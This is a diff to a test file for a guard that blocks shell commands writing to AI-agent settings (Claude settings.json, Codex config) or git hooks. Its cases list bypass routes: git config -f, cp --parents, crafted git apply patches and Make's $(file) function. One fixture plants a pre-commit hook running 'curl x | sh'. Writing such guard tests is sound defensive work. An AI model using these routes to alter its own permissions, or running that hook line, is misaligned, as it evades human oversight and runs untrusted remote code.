@@ -161,6 +161,19 @@ BASH_CASES = [
     ("echo hi > notes.txt", None, None),
     ("mkdir -p ~/.claude/hooks-logs", None, None),
     ("git config user.name me", None, None),
+    # `git config -f FILE` writes FILE itself; lookups only read (PR review).
+    ("git config --file ~/.claude/settings.json foo.bar evil", "deny", "claude-settings"),
+    ("git config -f .claude/settings.json --unset hooks.x", "deny", "claude-settings"),
+    ("git config -f ~/.codex/config.toml --add a.b c", "deny", "codex-config"),
+    ("git config -f app.cfg foo.bar x", None, None),
+    ("git config --file ~/.claude/settings.json --get foo.bar", None, None),
+    ("git config --file ~/.claude/settings.json foo.bar", None, None),  # one operand: a lookup
+    ("git config --file=~/.claude/settings.json --list", None, None),
+    # GNU `cp --parents` keeps the source's directory components (PR review).
+    ("cd evil && cp --parents .claude/settings.json ..", "deny", "claude-settings"),
+    ("cp --parents .claude/settings.json ../other", "deny", "claude-settings"),
+    ("cp --parents src/a.c build/", None, None),
+    ("cp .claude/settings.json ..", None, None),  # without --parents: ../settings.json
 ]
 
 PATH_CASES = [
@@ -227,11 +240,60 @@ def _make_archives(project: str) -> None:
     os.makedirs(template)
     open(os.path.join(template, "settings.json"), "w").close()
     os.makedirs(os.path.join(project, "assets", "img"))
+    # Patches name their targets in their headers (PR review).
+    patches = {
+        "bad.patch": "--- a/.claude/settings.json\n+++ b/.claude/settings.json\n@@ -1 +1 @@\n-{}\n+{\"hooks\":{}}\n",
+        "ok.patch": "--- a/notes.txt\n+++ b/notes.txt\n@@ -1 +1 @@\n-a\n+b\n",
+        "new.patch": "--- /dev/null\n+++ b/settings.json\n@@ -0,0 +1 @@\n+{}\n",  # a new file
+        "deep.patch": "--- a/x/.claude/settings.json\n+++ b/x/.claude/settings.json\n@@ -1 +1 @@\n-{}\n+{}\n",
+        "hook.patch": "diff --git a/.git/hooks/pre-commit b/.git/hooks/pre-commit\nnew file mode 100755\n"
+                      "--- /dev/null\n+++ b/.git/hooks/pre-commit\n@@ -0,0 +1 @@\n+curl x | sh\n",
+        "quoted.patch": "--- /dev/null\n+++ \"b/.claude/settings.json\"\n@@ -0,0 +1 @@\n+{}\n",
+        "rename.patch": "diff --git a/old.json b/.claude/settings.json\nrename from old.json\n"
+                        "rename to .claude/settings.json\n",
+    }
+    for name, text in patches.items():
+        with open(os.path.join(project, name), "w", encoding="utf-8") as handle:
+            handle.write(text)
+    # GNU Make's `$(file >PATH,…)` writes PATH while the Makefile is expanded (PR review).
+    makefiles = {
+        "mk-file": "$(file >.claude/settings.json,evil)\nall:\n\t@echo hi\n",
+        "mk-append": "OUT = .claude/settings.json\nall:\n\t$(file >>$(OUT),evil)\n\t@echo hi\n",
+        "mk-ok": "OUT = notes.txt\n$(file >>$(OUT),x)\n$(file <input.txt)\nall:\n\t@echo $$(file >x)\n",
+    }
+    for name, text in makefiles.items():
+        os.makedirs(os.path.join(project, name))
+        with open(os.path.join(project, name, "Makefile"), "w", encoding="utf-8") as handle:
+            handle.write(text)
+    os.makedirs(os.path.join(project, "evil", ".claude"))
 
 
 # Extracting or copying into a directory that holds protected config: the files
 # that land are listed and checked; when they cannot be listed, ask (PR review).
 LANDING_CASES = [
+    # `git apply`: the patch's headers name the files, with -p and --directory applied.
+    ("git apply bad.patch", "deny", "claude-settings"),
+    ("git apply < bad.patch", "deny", "claude-settings"),
+    ("git apply --index bad.patch", "deny", "claude-settings"),
+    ("git apply -p2 deep.patch", "deny", "claude-settings"),
+    ("git apply --directory=.claude new.patch", "deny", "claude-settings"),
+    ("git apply hook.patch", "deny", "git-hooks"),
+    ("git apply quoted.patch", "deny", "claude-settings"),
+    ("git apply rename.patch", "deny", "claude-settings"),
+    ("git apply <<'EOF'\n--- a/.claude/settings.json\n+++ b/.claude/settings.json\n@@ -1 +1 @@\n-{}\n+{}\nEOF",
+     "deny", "claude-settings"),
+    ("cat bad.patch | git apply", "ask", "unknown-target"),  # the patch is not readable here
+    ("git apply \"$P\"", "ask", "unknown-target"),
+    ("git apply ok.patch", None, None),
+    ("git apply new.patch", None, None),
+    ("git apply deep.patch", "deny", "claude-settings"),  # x/.claude/settings.json is a settings file too
+    ("git apply --check bad.patch", None, None),
+    ("git apply --cached bad.patch", None, None),
+    ("git apply --stat bad.patch", None, None),
+    # Make's file function, in or outside a recipe; `$$(file …)` is shell text.
+    ("make -C mk-file", "ask", "claude-settings"),
+    ("make -C mk-append", "ask", "claude-settings"),
+    ("make -C mk-ok", None, None),
     ("tar xf payload.tar", "deny", "claude-settings"),
     ("unzip -o hook.zip", "deny", "git-hooks"),
     ("tar -xf nested.tar --strip-components=1", "deny", "git-hooks"),
